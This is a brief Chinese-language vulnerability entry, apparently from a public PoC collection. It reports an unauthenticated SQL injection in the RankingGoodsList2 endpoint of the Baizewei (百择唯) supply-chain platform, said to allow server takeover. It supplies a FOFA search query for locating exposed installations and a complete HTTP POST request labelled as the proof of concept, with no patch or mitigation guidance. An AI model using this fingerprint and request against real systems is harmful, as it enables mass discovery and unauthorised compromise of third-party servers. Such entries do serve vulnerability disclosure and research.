# 百择唯供应链存在RankingGoodsList2存在SQL注入漏洞

百择唯供应链存在RankingGoodsList2 SQL注入漏洞，未经身份验证的攻击者通过漏洞，执行任意代码从而获取到服务器权限。

## fofa

```javascript
body="/Content/Css/_SiteCss/"
```

## poc

```javascript
POST /Goods/RankingGoodsList2 HTTP/1.1
Host: 
Content-Length: 99
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

goodsTypeList%5B%5D=090501&goodsSortType=Recommend&ColumnName=%E5%90%8C%E7%B1%BB%E6%8E%A8%E8%8D%90
```

![ddd1da3ecfceda9da7b026bffc218972](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411211145704.png)
